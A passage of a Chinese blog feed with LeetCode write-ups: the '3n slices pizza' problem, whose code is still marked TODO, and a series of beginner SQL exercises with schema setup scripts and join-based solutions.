href="#3n-块披萨" class="headerlink" title="3n 块披萨"></a><a href="https://leetcode-cn.com/problems/pizza-with-3n-slices/" target="_blank" rel="noopener">3n 块披萨</a></h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>给你一个披萨，它由 3n 块不同大小的部分组成，现在你和你的朋友们需要按照如下规则来分披萨：</p><p>你挑选任意 一块披萨。</p><p>Alice 将会挑选你所选择的披萨逆时针方向的下一块披萨。</p><p>Bob 将会挑选你所选择的披萨顺时针方向的下一块披萨。</p><p>重复上述过程直到没有披萨剩下。</p><p>每一块披萨的大小按顺时针方向由循环数组 slices 表示。</p><p>请你返回你可以获得的披萨大小总和的最大值。</p><p>示例 1：</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gd22i9jx5ej20tw0fvwgi.jpg" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：slices = [1,2,3,4,5,6]</span><br><span class="line">输出：10</span><br><span class="line">解释：选择大小为 4 的披萨，Alice 和 Bob 分别挑选大小为 3 和 5 的披萨。然后你选择大小为 6 的披萨，Alice 和 Bob 分别挑选大小为 2 和 1 的披萨。你获得的披萨总大小为 4 + 6 = 10 。</span><br></pre></td></tr></table></figure><p>示例 2：</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gd2mo9y8csj20t70h8mz3.jpg" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：slices = [8,9,8,6,1,1]</span><br><span class="line">输出：16</span><br><span class="line">解释：两轮都选大小为 8 的披萨。如果你选择大小为 9 的披萨，你的朋友们就会选择大小为 8 的披萨，这种情况下你的总和不是最大的。</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：slices = [4,1,2,5,8,3,1,9,7]</span><br><span class="line">输出：21</span><br></pre></td></tr></table></figure><p>示例 4：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：slices = [3,1,2]</span><br><span class="line">输出：3</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= slices.length &lt;= 500</code></li><li><code>slices.length % 3 == 0</code></li><li><code>1 &lt;= slices[i] &lt;= 1000</code></li></ul><h3 id="解法-3"><a href="#解法-3" class="headerlink" title="解法"></a>解法</h3><p>这题直接贪心显然不行，两个特点，一个是形成环，并且选了这个，其左右两边的将被丢弃。</p><p>很容易联想到类似的题，即打家劫舍系列里的不能偷相邻的，以及房子围成圆形。</p><p>所以问题就转化为——不相邻有限子数列的最大和，该子数列不能同时包含首尾。</p><p>即在大小为 3n 的数组中挑选 n 个满足上面条件的数。比如 1~9 披萨时的情况，只能拿走三份。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  idx 1 2 3 4 5 6 7 8 9</span><br><span class="line">case1 -   -   -</span><br><span class="line">case2 -   -       -</span><br><span class="line">case3 -     -   -</span><br><span class="line">case4   -     -   -</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TODO 代码还有点小问题，需要调调</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;总的来说题目挺简单的。晚上做题注意力没那么集中，看错几次题，浪费不少时间，可惜了。&lt;/p&gt;
&lt;h2 id=&quot;两个数组间的距离值&quot;&gt;&lt;a href=&quot;#两个数组间的距离值&quot; class=&quot;headerlink&quot; title=&quot;两个数组间的距离值&quot;&gt;&lt;/a&gt;&lt;a href=&quot;h
      
    
    </summary>
    
    
      <category term="算法" scheme="https://wywwzjj.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode 数据库专题</title>
    <link href="https://wywwzjj.top/2020/03/21/LeetCode-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%93%E9%A2%98/"/>
    <id>https://wywwzjj.top/2020/03/21/LeetCode-数据库专题/</id>
    <published>2020-03-21T02:27:38.000Z</published>
    <updated>2020-03-22T10:11:48.068Z</updated>
    
    <content type="html"><![CDATA[<p><strong>以下题目从易到难。</strong></p><h2 id="1378-使用唯一标识码替换员工ID"><a href="#1378-使用唯一标识码替换员工ID" class="headerlink" title="1378. 使用唯一标识码替换员工ID"></a><a href="https://leetcode-cn.com/problems/replace-employee-id-with-the-unique-identifier/" target="_blank" rel="noopener">1378. 使用唯一标识码替换员工ID</a></h2><p>SQL架构</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> <span class="keyword">If</span> <span class="keyword">Not</span> <span class="keyword">Exists</span> Employees (<span class="keyword">id</span> <span class="built_in">int</span>, <span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">20</span>))</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> <span class="keyword">If</span> <span class="keyword">Not</span> <span class="keyword">Exists</span> EmployeeUNI (<span class="keyword">id</span> <span class="built_in">int</span>, unique_id <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Employees</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Employees (<span class="keyword">id</span>, <span class="keyword">name</span>) <span class="keyword">values</span> (<span class="string">'1'</span>, <span class="string">'Alice'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Employees (<span class="keyword">id</span>, <span class="keyword">name</span>) <span class="keyword">values</span> (<span class="string">'7'</span>, <span class="string">'Bob'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Employees (<span class="keyword">id</span>, <span class="keyword">name</span>) <span class="keyword">values</span> (<span class="string">'11'</span>, <span class="string">'Meir'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Employees (<span class="keyword">id</span>, <span class="keyword">name</span>) <span class="keyword">values</span> (<span class="string">'90'</span>, <span class="string">'Winston'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Employees (<span class="keyword">id</span>, <span class="keyword">name</span>) <span class="keyword">values</span> (<span class="string">'3'</span>, <span class="string">'Jonathan'</span>)</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> EmployeeUNI</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> EmployeeUNI (<span class="keyword">id</span>, unique_id) <span class="keyword">values</span> (<span class="string">'3'</span>, <span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> EmployeeUNI (<span class="keyword">id</span>, unique_id) <span class="keyword">values</span> (<span class="string">'11'</span>, <span class="string">'2'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> EmployeeUNI (<span class="keyword">id</span>, unique_id) <span class="keyword">values</span> (<span class="string">'90'</span>, <span class="string">'3'</span>)</span><br></pre></td></tr></table></figure><p><code>Employees</code> 表：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------+---------+</span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+---------------+---------+</span><br><span class="line">| id            | int     |</span><br><span class="line">| name          | varchar |</span><br><span class="line">+---------------+---------+</span><br><span class="line">id 是这张表的主键。</span><br><span class="line">这张表的每一行分别代表了某公司其中一位员工的名字和 ID 。</span><br></pre></td></tr></table></figure><p><code>EmployeeUNI</code> 表：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------+---------+</span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+---------------+---------+</span><br><span class="line">| id            | int     |</span><br><span class="line">| unique_id     | int     |</span><br><span class="line">+---------------+---------+</span><br><span class="line">(id, unique_id) 是这张表的主键。</span><br><span class="line">这张表的每一行包含了该公司某位员工的 ID 和他的唯一标识码（unique ID）。</span><br></pre></td></tr></table></figure><p>写一段SQL查询来展示每位用户的 <strong>唯一标识码（unique ID ）</strong>；如果某位员工没有唯一标识码，使用 null 填充即可。你可以以 <strong>任意</strong> 顺序返回结果表。查询结果的格式如下例所示：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Employees table:</span><br><span class="line">+----+----------+</span><br><span class="line">| id | name     |</span><br><span class="line">+----+----------+</span><br><span class="line">| 1  | Alice    |</span><br><span class="line">| 7  | Bob      |</span><br><span class="line">| 11 | Meir     |</span><br><span class="line">| 90 | Winston  |</span><br><span class="line">| 3  | Jonathan |</span><br><span class="line">+----+----------+</span><br><span class="line"></span><br><span class="line">EmployeeUNI table:</span><br><span class="line">+----+-----------+</span><br><span class="line">| id | unique_id |</span><br><span class="line">+----+-----------+</span><br><span class="line">| 3  | 1         |</span><br><span class="line">| 11 | 2         |</span><br><span class="line">| 90 | 3         |</span><br><span class="line">+----+-----------+</span><br><span class="line"></span><br><span class="line">EmployeeUNI table:</span><br><span class="line">+-----------+----------+</span><br><span class="line">| unique_id | name     |</span><br><span class="line">+-----------+----------+</span><br><span class="line">| null      | Alice    |</span><br><span class="line">| null      | Bob      |</span><br><span class="line">| 2         | Meir     |</span><br><span class="line">| 3         | Winston  |</span><br><span class="line">| 1         | Jonathan |</span><br><span class="line">+-----------+----------+</span><br><span class="line"></span><br><span class="line">Alice and Bob 没有唯一标识码, 因此我们使用 null 替代。</span><br><span class="line">Meir 的唯一标识码是 2 。</span><br><span class="line">Winston 的唯一标识码是 3 。</span><br><span class="line">Jonathan 唯一标识码是 1 。</span><br></pre></td></tr></table></figure><h3 id="SQL-语句"><a href="#SQL-语句" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> unique_id, <span class="keyword">name</span></span><br><span class="line"><span class="keyword">from</span> Employees</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> EmployeeUNI</span><br><span class="line"><span class="keyword">on</span> Employees.id = EmployeeUNI.id;</span><br></pre></td></tr></table></figure><h2 id="1350-院系无效的学生"><a href="#1350-院系无效的学生" class="headerlink" title="1350. 院系无效的学生"></a><a href="https://leetcode-cn.com/problems/students-with-invalid-departments/" target="_blank" rel="noopener">1350. 院系无效的学生</a></h2><p>SQL架构</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> <span class="keyword">If</span> <span class="keyword">Not</span> <span class="keyword">Exists</span> Departments (<span class="keyword">id</span> <span class="built_in">int</span>, <span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">30</span>))</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> <span class="keyword">If</span> <span class="keyword">Not</span> <span class="keyword">Exists</span> Students (<span class="keyword">id</span> <span class="built_in">int</span>, <span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">30</span>), department_id <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Departments</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Departments (<span class="keyword">id</span>, <span class="keyword">name</span>) <span class="keyword">values</span> (<span class="string">'1'</span>, <span class="string">'Electrical Engineering'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Departments (<span class="keyword">id</span>, <span class="keyword">name</span>) <span class="keyword">values</span> (<span class="string">'7'</span>, <span class="string">'Computer Engineering'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Departments (<span class="keyword">id</span>, <span class="keyword">name</span>) <span class="keyword">values</span> (<span class="string">'13'</span>, <span class="string">'Bussiness Administration'</span>)</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Students</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Students (<span class="keyword">id</span>, <span class="keyword">name</span>, department_id) <span class="keyword">values</span> (<span class="string">'23'</span>, <span class="string">'Alice'</span>, <span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Students (<span class="keyword">id</span>, <span class="keyword">name</span>, department_id) <span class="keyword">values</span> (<span class="string">'1'</span>, <span class="string">'Bob'</span>, <span class="string">'7'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Students (<span class="keyword">id</span>, <span class="keyword">name</span>, department_id) <span class="keyword">values</span> (<span class="string">'5'</span>, <span class="string">'Jennifer'</span>, <span class="string">'13'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Students (<span class="keyword">id</span>, <span class="keyword">name</span>, department_id) <span class="keyword">values</span> (<span class="string">'2'</span>, <span class="string">'John'</span>, <span class="string">'14'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Students (<span class="keyword">id</span>, <span class="keyword">name</span>, department_id) <span class="keyword">values</span> (<span class="string">'4'</span>, <span class="string">'Jasmine'</span>, <span class="string">'77'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Students (<span class="keyword">id</span>, <span class="keyword">name</span>, department_id) <span class="keyword">values</span> (<span class="string">'3'</span>, <span class="string">'Steve'</span>, <span class="string">'74'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Students (<span class="keyword">id</span>, <span class="keyword">name</span>, department_id) <span class="keyword">values</span> (<span class="string">'6'</span>, <span class="string">'Luis'</span>, <span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Students (<span class="keyword">id</span>, <span class="keyword">name</span>, department_id) <span class="keyword">values</span> (<span class="string">'8'</span>, <span class="string">'Jonathan'</span>, <span class="string">'7'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Students (<span class="keyword">id</span>, <span class="keyword">name</span>, department_id) <span class="keyword">values</span> (<span class="string">'7'</span>, <span class="string">'Daiana'</span>, <span class="string">'33'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Students (<span class="keyword">id</span>, <span class="keyword">name</span>, department_id) <span class="keyword">values</span> (<span class="string">'11'</span>, <span class="string">'Madelynn'</span>, <span class="string">'1'</span>)</span><br></pre></td></tr></table></figure><p>院系表: <code>Departments</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------+---------+</span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+---------------+---------+</span><br><span class="line">| id            | int     |</span><br><span class="line">| name          | varchar |</span><br><span class="line">+---------------+---------+</span><br><span class="line">id 是该表的主键</span><br><span class="line">该表包含一所大学每个院系的 id 信息</span><br></pre></td></tr></table></figure><p>学生表: <code>Students</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------+---------+</span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+---------------+---------+</span><br><span class="line">| id            | int     |</span><br><span class="line">| name          | varchar |</span><br><span class="line">| department_id | int     |</span><br><span class="line">+---------------+---------+</span><br><span class="line">id 是该表的主键</span><br><span class="line">该表包含一所大学每个学生的 id 和他/她就读的院系信息</span><br></pre></td></tr></table></figure><p>写一条 SQL 语句以查询那些所在院系不存在的学生的 id 和姓名。</p><p>可以以任何顺序返回结果，下面是返回结果格式的例子</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Departments 表:</span><br><span class="line">+------+--------------------------+</span><br><span class="line">| id   | name                     |</span><br><span class="line">+------+--------------------------+</span><br><span class="line">| 1    | Electrical Engineering   |</span><br><span class="line">| 7    | Computer Engineering     |</span><br><span class="line">| 13   | Bussiness Administration |</span><br><span class="line">+------+--------------------------+</span><br><span class="line"></span><br><span class="line">Students 表:</span><br><span class="line">+------+----------+---------------+</span><br><span class="line">| id   | name     | department_id |</span><br><span class="line">+------+----------+---------------+</span><br><span class="line">| 23   | Alice    | 1             |</span><br><span class="line">| 1    | Bob      | 7             |</span><br><span class="line">| 5    | Jennifer | 13            |</span><br><span class="line">| 2    | John     | 14            |</span><br><span class="line">| 4    | Jasmine  | 77            |</span><br><span class="line">| 3    | Steve    | 74            |</span><br><span class="line">| 6    | Luis     | 1             |</span><br><span class="line">| 8    | Jonathan | 7             |</span><br><span class="line">| 7    | Daiana   | 33            |</span><br><span class="line">| 11   | Madelynn | 1             |</span><br><span class="line">+------+----------+---------------+</span><br><span class="line"></span><br><span class="line">结果表:</span><br><span class="line">+------+----------+</span><br><span class="line">| id   | name     |</span><br><span class="line">+------+----------+</span><br><span class="line">| 2    | John     |</span><br><span class="line">| 7    | Daiana   |</span><br><span class="line">| 4    | Jasmine  |</span><br><span class="line">| 3    | Steve    |</span><br><span class="line">+------+----------+</span><br><span class="line"></span><br><span class="line">John, Daiana, Steve 和 Jasmine 所在的院系分别是 14, 33, 74 和 77， 其中 14, 33, 74 和 77 并不存在于院系表</span><br></pre></td></tr></table></figure><h3 id="SQL-语句-1"><a href="#SQL-语句-1" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>, <span class="string">`name`</span></span><br><span class="line"><span class="keyword">from</span> Students</span><br><span class="line"><span class="keyword">where</span> department_id <span class="keyword">not</span> <span class="keyword">in</span> ( <span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> Departments)</span><br></pre></td></tr></table></figure><h2 id="1068-产品销售分析-I"><a href="#1068-产品销售分析-I" class="headerlink" title="1068. 产品销售分析 I"></a><a href="https://leetcode-cn.com/problems/product-sales-analysis-i/" target="_blank" rel="noopener">1068. 产品销售分析 I</a></h2><p>SQL架构</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> Sales (sale_id <span class="built_in">int</span>, product_id <span class="built_in">int</span>, <span class="keyword">year</span> <span class="built_in">int</span>, quantity <span class="built_in">int</span>, price <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> Product (product_id <span class="built_in">int</span>, product_name <span class="built_in">varchar</span>(<span class="number">10</span>))</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Sales</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Sales (sale_id, product_id, <span class="keyword">year</span>, quantity, price) <span class="keyword">values</span> (<span class="string">'1'</span>, <span class="string">'100'</span>, <span class="string">'2008'</span>, <span class="string">'10'</span>, <span class="string">'5000'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Sales (sale_id, product_id, <span class="keyword">year</span>, quantity, price) <span class="keyword">values</span> (<span class="string">'2'</span>, <span class="string">'100'</span>, <span class="string">'2009'</span>, <span class="string">'12'</span>, <span class="string">'5000'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Sales (sale_id, product_id, <span class="keyword">year</span>, quantity, price) <span class="keyword">values</span> (<span class="string">'7'</span>, <span class="string">'200'</span>, <span class="string">'2011'</span>, <span class="string">'15'</span>, <span class="string">'9000'</span>)</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Product</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Product (product_id, product_name) <span class="keyword">values</span> (<span class="string">'100'</span>, <span class="string">'Nokia'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Product (product_id, product_name) <span class="keyword">values</span> (<span class="string">'200'</span>, <span class="string">'Apple'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Product (product_id, product_name) <span class="keyword">values</span> (<span class="string">'300'</span>, <span class="string">'Samsung'</span>)</span><br></pre></td></tr></table></figure><p>销售表 <code>Sales</code>：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-------------+-------+</span><br><span class="line">| Column Name | Type  |</span><br><span class="line">+-------------+-------+</span><br><span class="line">| sale_id     | int   |</span><br><span class="line">| product_id  | int   |</span><br><span class="line">| year        | int   |</span><br><span class="line">| quantity    | int   |</span><br><span class="line">| price       | int   |</span><br><span class="line">+-------------+-------+</span><br><span class="line">(sale_id, year) 是销售表 Sales 的主键.</span><br><span class="line">product_id 是产品表 Product 的外键.</span><br><span class="line">注意: price 表示每单位价格</span><br></pre></td></tr></table></figure><p>产品表 <code>Product</code>：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+--------------+---------+</span><br><span class="line">| Column Name  | Type    |</span><br><span class="line">+--------------+---------+</span><br><span class="line">| product_id   | int     |</span><br><span class="line">| product_name | varchar |</span><br><span class="line">+--------------+---------+</span><br><span class="line">product_id 是表的主键.</span><br></pre></td></tr></table></figure><p>写一条SQL 查询语句获取产品表 <code>Product</code> 中所有的 <strong>产品名称 product name</strong> 以及 该产品在 <code>Sales</code> 表中相对应的 <strong>上市年份 year</strong> 和 <strong>价格 price</strong>。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sales 表：</span><br><span class="line">+---------+------------+------+----------+-------+</span><br><span class="line">| sale_id | product_id | year | quantity | price |</span><br><span class="line">+---------+------------+------+----------+-------+ </span><br><span class="line">| 1       | 100        | 2008 | 10       | 5000  |</span><br><span class="line">| 2       | 100        | 2009 | 12       | 5000  |</span><br><span class="line">| 7       | 200        | 2011 | 15       | 9000  |</span><br><span class="line">+---------+------------+------+----------+-------+</span><br><span class="line"></span><br><span class="line">Product 表：</span><br><span class="line">+------------+--------------+</span><br><span class="line">| product_id | product_name |</span><br><span class="line">+------------+--------------+</span><br><span class="line">| 100        | Nokia        |</span><br><span class="line">| 200        | Apple        |</span><br><span class="line">| 300        | Samsung      |</span><br><span class="line">+------------+--------------+</span><br><span class="line"></span><br><span class="line">Result 表：</span><br><span class="line">+--------------+-------+-------+</span><br><span class="line">| product_name | year  | price |</span><br><span class="line">+--------------+-------+-------+</span><br><span class="line">| Nokia        | 2008  | 5000  |</span><br><span class="line">| Nokia        | 2009  | 5000  |</span><br><span class="line">| Apple        | 2011  | 9000  |</span><br><span class="line">+--------------+-------+-------+</span><br></pre></td></tr></table></figure><h3 id="SQL-语句-2"><a href="#SQL-语句-2" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> product_name, <span class="string">`year`</span>, price</span><br><span class="line"><span class="keyword">from</span> Sales s</span><br><span class="line"><span class="keyword">join</span> Product p </span><br><span class="line"><span class="keyword">on</span> s.product_id = p.product_id;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> product_name, <span class="string">`year`</span>, price</span><br><span class="line"><span class="keyword">from</span> Sales s</span><br><span class="line"><span class="keyword">join</span> Product <span class="keyword">using</span>(product_id);</span><br></pre></td></tr></table></figure><h2 id="1303-求团队人数"><a href="#1303-求团队人数" class="headerlink" title="1303. 求团队人数"></a><a href="https://leetcode-cn.com/problems/find-the-team-size/" target="_blank" rel="noopener">1303. 求团队人数</a></h2><p>SQL架构</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> <span class="keyword">If</span> <span class="keyword">Not</span> <span class="keyword">Exists</span> Employee (employee_id <span class="built_in">int</span>, team_id <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Employee</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Employee (employee_id, team_id) <span class="keyword">values</span> (<span class="string">'1'</span>, <span class="string">'8'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Employee (employee_id, team_id) <span class="keyword">values</span> (<span class="string">'2'</span>, <span class="string">'8'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Employee (employee_id, team_id) <span class="keyword">values</span> (<span class="string">'3'</span>, <span class="string">'8'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Employee (employee_id, team_id) <span class="keyword">values</span> (<span class="string">'4'</span>, <span class="string">'7'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Employee (employee_id, team_id) <span class="keyword">values</span> (<span class="string">'5'</span>, <span class="string">'9'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Employee (employee_id, team_id) <span class="keyword">values</span> (<span class="string">'6'</span>, <span class="string">'9'</span>)</span><br></pre></td></tr></table></figure><p>员工表：<code>Employee</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------+---------+</span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+---------------+---------+</span><br><span class="line">| employee_id   | int     |</span><br><span class="line">| team_id       | int     |</span><br><span class="line">+---------------+---------+</span><br><span class="line">employee_id 字段是这张表的主键，表中的每一行都包含每个员工的 ID 和他们所属的团队。</span><br></pre></td></tr></table></figure><p>编写一个 SQL 查询，以求得每个员工所在团队的总人数。</p><p>查询结果中的顺序无特定要求。查询结果格式示例如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Employee Table:</span><br><span class="line">+-------------+------------+</span><br><span class="line">| employee_id | team_id    |</span><br><span class="line">+-------------+------------+</span><br><span class="line">|     1       |     8      |</span><br><span class="line">|     2       |     8      |</span><br><span class="line">|     3       |     8      |</span><br><span class="line">|     4       |     7      |</span><br><span class="line">|     5       |     9      |</span><br><span class="line">|     6       |     9      |</span><br><span class="line">+-------------+------------+</span><br><span class="line">Result table:</span><br><span class="line">+-------------+------------+</span><br><span class="line">| employee_id | team_size  |</span><br><span class="line">+-------------+------------+</span><br><span class="line">|     1       |     3      |</span><br><span class="line">|     2       |     3      |</span><br><span class="line">|     3       |     3      |</span><br><span class="line">|     4       |     1      |</span><br><span class="line">|     5       |     2      |</span><br><span class="line">|     6       |     2      |</span><br><span class="line">+-------------+------------+</span><br><span class="line">ID 为 1、2、3 的员工是 team_id 为 8 的团队的成员，</span><br><span class="line">ID 为 4 的员工是 team_id 为 7 的团队的成员，</span><br><span class="line">ID 为 5、6 的员工是 team_id 为 9 的团队的成员。</span><br></pre></td></tr></table></figure><h3 id="SQL-语句-3"><a href="#SQL-语句-3" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> a.employee_id, b.team_size</span><br><span class="line"><span class="keyword">from</span> Employee a</span><br><span class="line"><span class="keyword">join</span> (<span class="keyword">select</span> team_id, <span class="keyword">count</span>(employee_id) team_size <span class="keyword">from</span> Employee <span class="keyword">group</span> <span class="keyword">by</span> team_id) b</span><br><span class="line"><span class="keyword">on</span> a.team_id = b.team_id</span><br></pre></td></tr></table></figure><h2 id="1069-产品销售分析-II"><a href="#1069-产品销售分析-II" class="headerlink" title="1069. 产品销售分析 II"></a><a href="https://leetcode-cn.com/problems/product-sales-analysis-ii/" target="_blank" rel="noopener">1069. 产品销售分析 II</a></h2><p>SQL架构</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> Sales (sale_id <span class="built_in">int</span>, product_id <span class="built_in">int</span>, <span class="keyword">year</span> <span class="built_in">int</span>, quantity <span class="built_in">int</span>, price <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> Product (product_id <span class="built_in">int</span>, product_name <span class="built_in">varchar</span>(<span class="number">10</span>))</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Sales</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Sales (sale_id, product_id, <span class="keyword">year</span>, quantity, price) <span class="keyword">values</span> (<span class="string">'1'</span>, <span class="string">'100'</span>, <span class="string">'2008'</span>, <span class="string">'10'</span>, <span class="string">'5000'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Sales (sale_id, product_id, <span class="keyword">year</span>, quantity, price) <span class="keyword">values</span> (<span class="string">'2'</span>, <span class="string">'100'</span>, <span class="string">'2009'</span>, <span class="string">'12'</span>, <span class="string">'5000'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Sales (sale_id, product_id, <span class="keyword">year</span>, quantity, price) <span class="keyword">values</span> (<span class="string">'7'</span>, <span class="string">'200'</span>, <span class="string">'2011'</span>, <span class="string">'15'</span>, <span class="string">'9000'</span>)</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Product</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Product (product_id, product_name) <span class="keyword">values</span> (<span class="string">'100'</span>, <span class="string">'Nokia'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Product (product_id, product_name) <span class="keyword">values</span> (<span class="string">'200'</span>, <span class="string">'Apple'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Product (product_id, product_name) <span class="keyword">values</span> (<span class="string">'300'</span>, <span class="string">'Samsung'</span>)</span><br></pre></td></tr></table></figure><p>销售表：<code>Sales</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-------------+-------+</span><br><span class="line">| Column Name | Type  |</span><br><span class="line">+-------------+-------+</span><br><span class="line">| sale_id     | int   |</span><br><span class="line">| product_id  | int   |</span><br><span class="line">| year        | int   |</span><br><span class="line">| quantity    | int   |</span><br><span class="line">| price       | int   |</span><br><span class="line">+-------------+-------+</span><br><span class="line">sale_id 是这个表的主键。</span><br><span class="line">product_id 是 Product 表的外键。</span><br><span class="line">请注意价格是每单位的。</span><br></pre></td></tr></table></figure><p>产品表：<code>Product</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+--------------+---------+</span><br><span class="line">| Column Name  | Type    |</span><br><span class="line">+--------------+---------+</span><br><span class="line">| product_id   | int     |</span><br><span class="line">| product_name | varchar |</span><br><span class="line">+--------------+---------+</span><br><span class="line">product_id 